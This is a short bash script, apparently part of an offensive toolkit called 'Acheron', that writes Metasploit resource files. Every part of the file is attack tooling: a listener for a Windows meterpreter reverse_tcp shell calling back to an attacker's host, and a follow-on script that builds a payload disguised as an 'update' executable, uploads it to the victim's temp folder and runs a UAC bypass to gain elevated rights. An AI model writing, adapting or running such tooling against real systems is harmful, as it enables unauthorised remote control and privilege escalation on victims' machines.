#!/bin/bash
# Listener Generator - Generates msfconsole resource script with UAC bypass
# Portable, no hardcoded paths

set -euo pipefail

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <port> <lhost>" >&2
    exit 1
fi

PORT="$1"; LHOST="$2"
OUTFILE="/tmp/acheron_listener_${PORT}.rc"
BYPASS_RC="/tmp/bypassuac.rc"

# Generate dynamic bypass UAC script with LHOST/LPORT
# Generate random payload name at generation time
PAYLOAD_NAME="update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe"

cat > "/tmp/bypassuac.rc" << BYPASS_EOF
# UAC Bypass Method 59 - Debug Object / PPID Spoofing
# Run MANUALLY in meterpreter: resource /tmp/bypassuac.rc

# Generate new Acheron payload with same LHOST/LPORT
run generate -f exe -o /tmp/\$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT

# Upload to victim %TEMP%
upload /tmp/\$PAYLOAD_NAME %TEMP%\\\\\$PAYLOAD_NAME

# Execute UAC bypass executable with our payload
execute -f C:\\Windows\\Temp\\uacbypass.exe -a "%TEMP%\\\\$PAYLOAD_NAME" -H -i

# Clean up
rm /tmp/\$PAYLOAD_NAME
BYPASS_EOF

# Generate listener resource script
cat > "$OUTFILE" << RC
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false

# Create alias 'bypassuac' automatically on session creation
set InitialAutoRunScript multi_console_command -rc /tmp/bypassuac_alias.rc

exploit -j -z
RC

# Create alias script
cat > /tmp/bypassuac_alias.rc << ALIAS_EOF
alias bypassuac resource /tmp/bypassuac.rc
ALIAS_EOF

# Removed alias script generation - user will run bypassuac manually
echo "[*] Run: msfconsole -r $OUTFILE" >&2
echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc)" >&2
# Output ONLY the file path to stdout (for capture)
echo "$OUTFILE"